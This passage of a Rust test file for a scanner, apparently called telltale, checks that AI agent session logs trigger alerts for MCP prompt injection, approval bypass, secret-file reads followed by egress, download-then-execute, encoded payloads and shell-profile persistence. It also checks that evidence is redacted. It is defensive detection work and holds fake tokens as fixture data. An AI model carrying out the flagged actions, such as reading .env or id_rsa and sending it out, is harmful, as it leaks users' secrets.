            .iter()
            .find(|event| event["session_id"] == session_id)
            .unwrap_or_else(|| panic!("missing detection for {session_id}"));
        assert!(validator.is_valid(event), "invalid event for {session_id}");
        assert_eq!(event["event_type"], "detection", "{session_id}");
        assert_eq!(event["severity"], "critical", "{session_id}");
        assert!(
            event["rule_ids"]
                .as_array()
                .expect("rule ids")
                .iter()
                .any(|rule| rule == "mcp.tool_metadata.prompt_injection"),
            "{session_id}"
        );
        if session_id == "uc001-positive-server-instructions" {
            assert!(
                event["categories"]
                    .as_array()
                    .expect("categories")
                    .iter()
                    .any(|category| category == "mcp_prompt_injection")
            );
        }
        assert!(
            event["evidence"]
                .as_array()
                .expect("evidence")
                .iter()
                .all(|item| {
                    let value = item["redacted_value"].as_str().expect("redacted value");
                    !value.contains(".env") && !value.contains("mcp-lab")
                }),
            "unredacted evidence for {session_id}"
        );
    }

    let compliance_tool = events
        .iter()
        .find(|event| event["session_id"] == "uc001-positive-compliance-tool")
        .expect("compliance tool detection");
    assert!(
        validator.is_valid(compliance_tool),
        "compliance tool event failed schema validation"
    );
    assert_eq!(compliance_tool["event_type"], "detection");
    assert_eq!(compliance_tool["severity"], "critical");
    assert!(compliance_tool["tool_name"].is_null());
    assert!(
        compliance_tool["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        compliance_tool["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        compliance_tool["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("darkroastcyber.io")
            })
    );

    let reversed_injection = events
        .iter()
        .find(|event| event["session_id"] == "uc001-positive-reversed-injection")
        .expect("reversed injection detection");
    assert!(
        validator.is_valid(reversed_injection),
        "reversed injection event failed schema validation"
    );
    assert_eq!(reversed_injection["event_type"], "detection");
    assert_eq!(reversed_injection["severity"], "critical");
    assert!(reversed_injection["tool_name"].is_null());
    assert!(
        reversed_injection["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        reversed_injection["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        reversed_injection["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("darkroastcyber.io")
            })
    );

    let tool_result = events
        .iter()
        .find(|event| event["session_id"] == "tool-result-injection")
        .expect("tool result detection");
    assert!(
        validator.is_valid(tool_result),
        "tool result event failed schema validation"
    );
    assert_eq!(tool_result["event_type"], "detection");
    assert_eq!(tool_result["severity"], "critical");
    assert!(
        tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "approval.bypass.context")
    );
    assert!(
        tool_result["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "approval_bypass")
    );
    assert!(
        !tool_result["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "secret_access")
    );
    assert!(
        tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("mcp-lab")
            })
    );
}

#[test]
fn scan_once_preserves_source_specific_mcp_tool_results() {
    let events = &fixture_scan().events;
    let validator = event_schema_validator();
    let claude_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "claude-uc001-tool-result")
        .expect("claude tool result detection");
    assert!(
        validator.is_valid(claude_tool_result),
        "claude tool result event failed schema validation"
    );
    assert_eq!(claude_tool_result["event_type"], "detection");
    assert_eq!(claude_tool_result["client"], "claude");
    assert_eq!(claude_tool_result["severity"], "critical");
    assert_eq!(claude_tool_result["tool_name"], "repo_status");
    assert!(
        claude_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        claude_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        claude_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );

    let qwen_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "qwen-uc001-tool-result")
        .expect("qwen tool result detection");
    assert!(
        validator.is_valid(qwen_tool_result),
        "qwen tool result event failed schema validation"
    );
    assert_eq!(qwen_tool_result["event_type"], "detection");
    assert_eq!(qwen_tool_result["client"], "qwen");
    assert_eq!(qwen_tool_result["severity"], "critical");
    assert_eq!(qwen_tool_result["tool_name"], "repo_status");
    assert!(
        qwen_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        qwen_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        qwen_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );

    let openclaw_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "openclaw-uc001-tool-result")
        .expect("openclaw tool result detection");
    assert!(
        validator.is_valid(openclaw_tool_result),
        "openclaw tool result event failed schema validation"
    );
    assert_eq!(openclaw_tool_result["event_type"], "detection");
    assert_eq!(openclaw_tool_result["client"], "openclaw");
    assert_eq!(openclaw_tool_result["severity"], "critical");
    assert_eq!(openclaw_tool_result["tool_name"], "repo_status");
    assert!(
        openclaw_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        openclaw_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        openclaw_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );

    let opencode_sqlite_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "opencode-uc001-sqlite-tool-result")
        .expect("opencode sqlite tool result detection");
    assert!(
        validator.is_valid(opencode_sqlite_tool_result),
        "opencode sqlite tool result event failed schema validation"
    );
    assert_eq!(opencode_sqlite_tool_result["event_type"], "detection");
    assert_eq!(opencode_sqlite_tool_result["client"], "opencode");
    assert_eq!(opencode_sqlite_tool_result["severity"], "critical");
    assert_eq!(opencode_sqlite_tool_result["tool_name"], "repo_status");
    assert!(
        opencode_sqlite_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        opencode_sqlite_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        opencode_sqlite_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );
}

#[test]
fn scan_once_emits_token_injection_and_install_detections() {
    let events = &fixture_scan().events;
    let validator = event_schema_validator();
    let jwt_bearer_token = events
        .iter()
        .find(|event| event["session_id"] == "jwt-bearer-token-pattern")
        .expect("jwt bearer token detection");
    assert!(
        validator.is_valid(jwt_bearer_token),
        "jwt bearer token event failed schema validation"
    );
    assert_eq!(jwt_bearer_token["event_type"], "detection");
    assert_eq!(jwt_bearer_token["severity"], "low");
    assert!(
        jwt_bearer_token["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "credential.api_key.pattern")
    );
    assert!(
        jwt_bearer_token["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "credential_pattern")
    );
    assert!(
        jwt_bearer_token["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ")
                    && !value.contains("fixture_session_token_1234567890abcdef")
            })
    );

    let tool_injection_session = events
        .iter()
        .find(|event| event["session_id"] == "tool-injection-shape-session")
        .expect("tool injection session detection");
    assert!(
        validator.is_valid(tool_injection_session),
        "tool injection session event failed schema validation"
    );
    assert_eq!(tool_injection_session["event_type"], "detection");
    assert_eq!(tool_injection_session["severity"], "critical");
    assert!(
        tool_injection_session["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "tool.injection.shape")
    );
    assert!(
        tool_injection_session["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("mcp-lab")
            })
    );
    let tool_result = events
        .iter()
        .find(|event| event["session_id"] == "tool-result-injection")
        .expect("tool result detection");
    assert!(
        tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "network.controlled_test_domain.darkroast")
    );
    assert!(
        tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("darkroastcyber.io")
            })
    );
    let approval = events
        .iter()
        .find(|event| event["session_id"] == "approval-bypass-context")
        .expect("approval detection");
    assert!(
        validator.is_valid(approval),
        "approval bypass event failed schema validation"
    );
    assert_eq!(approval["event_type"], "detection");
    assert_eq!(approval["session_id"], "approval-bypass-context");
    assert!(
        approval["rule_ids"]
            .as_array()
            .is_some_and(|rules| { rules.iter().any(|rule| rule == "approval.bypass.context") })
    );
    assert!(approval["categories"].as_array().is_some_and(|categories| {
        categories
            .iter()
            .any(|category| category == "approval_bypass")
    }));

    let install_persistence = events
        .iter()
        .find(|event| event["session_id"] == "install-persistence-chain")
        .expect("install persistence detection");
    assert!(
        validator.is_valid(install_persistence),
        "install persistence event failed schema validation"
    );
    assert_eq!(install_persistence["event_type"], "detection");
    assert_eq!(install_persistence["severity"], "critical");
    assert!(
        install_persistence["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "install.package_manager")
    );
    assert!(
        install_persistence["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "persistence.shell_profile")
    );
    assert!(
        install_persistence["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.install_then_persistence")
    );
    assert!(
        install_persistence["categories"]
            .as_array()
            .is_some_and(|categories| {
                categories.iter().any(|category| category == "install")
                    && categories.iter().any(|category| category == "persistence")
            })
    );
    assert!(
        install_persistence["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains("darkroastcyber.io")
                    && !value.contains("pip install")
                    && !value.contains("~/.bashrc")
            })
    );
}

#[test]
fn scan_once_emits_execution_secret_and_api_key_detections() {
    let events = &fixture_scan().events;
    let validator = event_schema_validator();
    let encoded_payload = events
        .iter()
        .find(|event| event["session_id"] == "encoded-payload-chain")
        .expect("encoded payload detection");
    assert!(
        validator.is_valid(encoded_payload),
        "encoded payload event failed schema validation"
    );
    assert_eq!(encoded_payload["event_type"], "detection");
    assert_eq!(encoded_payload["severity"], "high");
    assert!(
        encoded_payload["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "execution.shell")
    );
    assert!(
        encoded_payload["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "execution.encoded_payload")
    );
    assert!(
        encoded_payload["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.shell_encoded_payload")
    );
    assert!(
        encoded_payload["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "execution")
    );
    assert!(
        encoded_payload["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag == "chain")
    );
    assert!(
        encoded_payload["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                item["hash"].is_string() && !value.contains("base64 --decode")
            })
    );

    let download_execute = events
        .iter()
        .find(|event| event["session_id"] == "download-execute-chain")
        .expect("download execute detection");
    assert!(
        validator.is_valid(download_execute),
        "download execute event failed schema validation"
    );
    assert_eq!(download_execute["event_type"], "detection");
    assert_eq!(download_execute["severity"], "high");
    assert!(
        download_execute["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "network.download")
    );
    assert!(
        download_execute["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "execution.shell")
    );
    assert!(
        download_execute["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.download_then_execute")
    );
    assert!(
        download_execute["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                item["hash"].is_string()
                    && !value.is_empty()
                    && !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
            })
    );

    let secret_network = events
        .iter()
        .find(|event| event["session_id"] == "secret-network-chain")
        .expect("secret network detection");
    assert!(
        validator.is_valid(secret_network),
        "secret network event failed schema validation"
    );
    assert_eq!(secret_network["event_type"], "detection");
    assert_eq!(secret_network["severity"], "critical");
    assert!(
        secret_network["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "secret.env.read")
    );
    assert!(
        secret_network["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "network.download")
    );
    assert!(
        secret_network["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.secret_then_network")
    );
    assert!(
        secret_network["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "secret_access")
            && secret_network["categories"]
                .as_array()
                .expect("categories")
                .iter()
                .any(|category| category == "download")
    );
    assert!(
        secret_network["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.is_empty() && !value.contains(".env") && !value.contains("darkroastcyber.io")
            })
    );

    let private_key = events
        .iter()
        .find(|event| event["session_id"] == "private-key-read")
        .expect("private key detection");
    assert!(
        validator.is_valid(private_key),
        "private key event failed schema validation"
    );
    assert_eq!(private_key["event_type"], "detection");
    assert_eq!(private_key["severity"], "medium");
    assert!(
        !private_key["rule_ids"]
            .as_array()
            .unwrap()
            .iter()
            .any(|id| id == "execution.shell"),
        "the bash tool name must not be synthesized into command evidence"
    );
    assert!(
        private_key["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "secret.private_key.read")
    );
    assert!(
        private_key["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "secret_access")
    );
    assert!(
        private_key["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains("id_rsa")
            })
    );

    let api_key = events
        .iter()
        .find(|event| event["session_id"] == "api-key-pattern")
        .expect("api key detection");
    assert!(
        validator.is_valid(api_key),
        "api key event failed schema validation"
    );
    assert_eq!(api_key["event_type"], "detection");
    assert_eq!(api_key["severity"], "low");
    assert!(
        api_key["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "credential.api_key.pattern")
    );
    assert!(
        api_key["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "credential_pattern")
    );
    assert!(
        api_key["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                item["hash"].is_string()
                    && !value.is_empty()
                    && !value.contains("ghp_1234567890abcdef1234")
            })
    );
}

#[test]
fn scan_once_excludes_negative_fixture_detections() {
    let events = &fixture_scan().events;
    assert_source_visibility_exclusions(events);
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-mcp-user-text")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-normal-mcp")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-server-instructions")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-domain-only")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "controlled-domain-user-text")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "controlled-domain-assistant-text")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-domain-tool-result")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "tool-result-injection"
            && event["severity"] != "critical")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "normal-mcp-tool-result")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "approval-bypass-user-text")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "approval-bypass-tool-result")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "approval-bypass-quoted-example")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "approval-bypass-cost-data")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "secret-access-auth-log")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "opencode-noise-approval-cost-data")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "opencode-noise-secret-auth-log")
    );
    assert!(
        events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "tool-injection-shape")
    );
    let tool_injection_shape_session = events
        .iter()
        .find(|event| event["session_id"] == "tool-injection-shape-session")
        .expect("tool injection shape session detection");
    let validator = event_schema_validator();
    assert!(
        validator.is_valid(tool_injection_shape_session),
        "tool injection shape session event failed schema validation"
    );
    assert_eq!(tool_injection_shape_session["event_type"], "detection");
    assert_eq!(tool_injection_shape_session["severity"], "critical");
    assert!(
        tool_injection_shape_session["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "tool.injection.shape")
    );
    assert!(
        tool_injection_shape_session["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && item["hash"].is_string()
            })
    );
    assert!(events.iter().any(|event| event["event_type"] == "detection"
        && event["session_id"] == "install-persistence-chain"));
    assert!(
        events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "secret-network-chain")
    );
}

#[test]
fn scan_summary_reports_log_and_state_path_precedence() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("empty-root");
    fs::create_dir_all(&root).expect("empty root");
    let env_log = temp.path().join("env-events.jsonl");
    let env_state = temp.path().join("env-state.json");

    let profile = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--no-local-config",
            "--path-profile",
            "project",
            "--root",
        ])
        .arg(&root)
        .arg("--install-inventory-disabled")
        .env("TELLTALE_LOG_PATH", "")
        .env("TELLTALE_STATE_PATH", "")
        .output()
        .expect("run profile scan");
    assert!(profile.status.success());
    let profile_summary: Value = serde_json::from_slice(&profile.stdout).expect("summary json");
    assert_eq!(
        profile_summary["effective_configuration"]["paths"]["log"]["origin"],
        "path_profile"
    );
    assert_eq!(
        profile_summary["effective_configuration"]["paths"]["state"]["origin"],
        "path_profile"
    );
    assert_eq!(
        profile_summary["effective_configuration"]["paths"]["log"]["path_hash"],
        path_hash(Path::new("logs/telltale-events.jsonl"))
    );
    assert_eq!(
        profile_summary["effective_configuration"]["paths"]["state"]["path_hash"],
        path_hash(Path::new("state/telltale-state.json"))
    );

    let environment = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .arg("--install-inventory-disabled")
        .env("TELLTALE_LOG_PATH", &env_log)
        .env("TELLTALE_STATE_PATH", &env_state)
        .output()
        .expect("run environment scan");
    assert!(environment.status.success());
    let environment_summary: Value =
        serde_json::from_slice(&environment.stdout).expect("summary json");
    assert_eq!(
        environment_summary["effective_configuration"]["paths"]["log"]["origin"],
        "environment"
    );
    assert_eq!(
        environment_summary["effective_configuration"]["paths"]["state"]["origin"],
        "environment"
    );
    assert_eq!(
        environment_summary["effective_configuration"]["paths"]["log"]["path_hash"],
        path_hash(&env_log)
    );

    let cli_log = temp.path().join("cli-events.jsonl");
    let cli_state = temp.path().join("cli-state.json");
    let cli = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .args(["--log-path"])
        .arg(&cli_log)
        .args(["--state-path"])
        .arg(&cli_state)
        .arg("--install-inventory-disabled")
        .env("TELLTALE_LOG_PATH", &env_log)
        .env("TELLTALE_STATE_PATH", &env_state)
        .output()
        .expect("run cli scan");
    assert!(cli.status.success());
    let cli_summary: Value = serde_json::from_slice(&cli.stdout).expect("summary json");
    assert_eq!(
        cli_summary["effective_configuration"]["paths"]["log"]["origin"],
        "cli"
    );
    assert_eq!(
        cli_summary["effective_configuration"]["paths"]["state"]["origin"],
        "cli"
    );
    assert_eq!(
        cli_summary["effective_configuration"]["paths"]["state"]["path_hash"],
        path_hash(&cli_state)
    );
}

#[test]
fn scan_once_client_filter_limits_discovered_sources() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--emit-activity",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--client",
            "qwen",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    let source_counts = summary["source_counts"]
        .as_object()
        .expect("source counts object");
    assert_eq!(source_counts.len(), 1);
    assert_eq!(source_counts["qwen.jsonl"], 2);
    assert_eq!(summary["source_discovery"]["returned_source_count"], 57);
    assert_eq!(summary["source_discovery"]["operational_source_count"], 2);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    assert!(!events.is_empty());
    assert!(
        events
            .iter()
            .all(|event| event["client"] == "scanner" || event["client"] == "qwen")
    );
}

#[test]
fn scan_once_accepts_repeated_client_filters() {
    let temp = tempdir().expect("tempdir");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--client",
            "codex",
            "--client",
            "qwen",
        ])
        .arg("--state-path")
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    let source_counts = summary["source_counts"]
        .as_object()
        .expect("source counts object");
    assert_eq!(source_counts.len(), 4);
    assert_eq!(source_counts["codex.jsonl"], 40);
    assert_eq!(source_counts["codex.archived_jsonl"], 2);
    assert_eq!(source_counts["codex.headless_jsonl"], 2);
    assert_eq!(source_counts["qwen.jsonl"], 2);
}

#[test]
fn scan_and_watch_reject_unknown_and_retired_client_filters() {
    for rejected in ["unknown-agent", "gemini", "roocode", "kilocode"] {
        for args in [vec!["scan", "--once"], vec!["watch"]] {
            let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
                .args(&args)
                .args([
                    "--dry-run",
                    "--root",
                    "tests/fixtures/session_stores",
                    "--client",
                    rejected,
                ])
                .output()
                .expect("run telltale");

            assert!(!output.status.success(), "{args:?}: {rejected}");
            let stderr = String::from_utf8_lossy(&output.stderr);
            for expected in [
                format!("unsupported client '{rejected}'"),
                "codex".to_string(),
                "qwen".to_string(),
            ] {
                assert!(stderr.contains(&expected), "{args:?}: {stderr}");
            }
            for retired in ["gemini,", "roocode,", "kilocode,"] {
                assert!(!stderr.contains(retired), "{args:?}: {stderr}");
            }
        }
    }
}

#[test]
fn scan_once_max_sources_limits_discovered_sources() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--emit-activity",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--client",
            "qwen",
            "--max-sources",
            "1",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    let source_counts = summary["source_counts"]
        .as_object()
        .expect("source counts object");
    assert_eq!(source_counts.len(), 1);
    assert_eq!(source_counts["qwen.jsonl"], 1);
    assert_eq!(summary["source_discovery"]["returned_source_count"], 57);
    assert_eq!(summary["source_discovery"]["operational_source_count"], 1);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let health = events
        .iter()
        .find(|event| event["event_type"] == "health")
        .expect("health event");
    assert_eq!(health["source_counts"]["qwen.jsonl"], 1);
}

#[test]
fn scan_once_max_sources_rejects_zero() {
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--max-sources",
            "0",
        ])
        .output()
        .expect("run telltale");

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("--max-sources must be greater than 0"));
}

#[test]
fn scan_once_max_sources_is_deterministic() {
    let temp = tempdir().expect("tempdir");
    let state_path = temp.path().join("scan-state.json");
    let run_scan = || {
        Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--dry-run",
                "--root",
                "tests/fixtures/session_stores",
                "--client",
                "codex",
                "--max-sources",
                "3",
                "--state-path",
            ])
            .arg(&state_path)
            .output()
            .expect("run telltale")
    };

    let first = run_scan();
    let second = run_scan();
    assert!(
        first.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&first.stderr)
    );
    assert!(
        second.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&second.stderr)
    );

    let first_summary: Value = serde_json::from_slice(&first.stdout).expect("first summary json");
    let second_summary: Value =
        serde_json::from_slice(&second.stdout).expect("second summary json");
    assert_eq!(
        first_summary["source_counts"],
        second_summary["source_counts"]
    );
    assert_eq!(
        first_summary["activity_count"],
        second_summary["activity_count"]
    );
    assert_eq!(
        first_summary["detection_count"],
        second_summary["detection_count"]
    );
}

#[test]
fn repeated_scans_suppress_duplicate_detections() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let run_scan = |extra: &[&str]| {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
                "tests/fixtures/session_stores",
                "--log-path",
            ])
            .arg(&log_path)
            .arg("--state-path")
            .arg(&state_path)
            .args(extra)
            .output()
            .expect("run telltale");
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        serde_json::from_slice::<Value>(&output.stdout).expect("scan summary json")
    };
    let first_summary = run_scan(&[]);
    assert_eq!(first_summary["detection_count"], 30);
    assert_eq!(first_summary["emitted_count"], 31);
    assert_source_processing_accounting(&first_summary);
    assert_detection_flow_accounting(&first_summary, 30, 0);

    let second_summary = run_scan(&[]);
    assert_eq!(second_summary["detection_count"], 30);
